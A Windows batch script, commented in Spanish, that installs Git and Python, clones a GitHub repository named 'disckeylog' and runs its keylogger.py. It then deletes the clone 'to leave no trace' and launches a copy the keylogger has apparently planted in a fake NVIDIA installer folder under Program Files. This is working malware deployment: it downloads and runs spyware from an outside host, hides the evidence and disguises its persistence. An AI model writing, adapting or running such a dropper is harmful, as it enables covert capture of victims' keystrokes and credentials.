@echo off

::check si git esta instalado
:check01
where git > nul 2>&1
if %errorlevel% neq 0 (
    echo "Git is not installed."
    goto gitinstall
    
) else (
    echo "Git is installed."
    goto check02
)
::instala git

:gitinstall
echo "Installing Git..."
winget install --id Git.Git -e --source winget
goto check01

:: checkea si python esta instalado
:check02
python --version 3>NUL
if errorlevel 1 goto errorNoPython
goto clone

::Instala python
:errorNoPython
echo Installing Python...
winget install -e --id Python.Python -v 3.9.0
goto check02

:: clona el repositorio de github
:clone
git clone https://github.com/Zer0plusOne/disckeylog

::Abre el directorio clonado
cd disckeylog

::Ejecuta el script
python3 keylogger.py

::Timeout
timeout /t 180

::elimina el repositorio para no dejar huella
cd ..
timeout /t 5
rmdir /s /q disckeylog
timeout /t 15

::abre la carpeta donde se encuentra la copia generada por el propio script
cd C:\Program Files\NVIDIA Corporation\Installer2\installer
::ejecuta el nuevo script
python3 keylogger.py

::fin de tu trabajo .bat, lo hiciste bien
exit
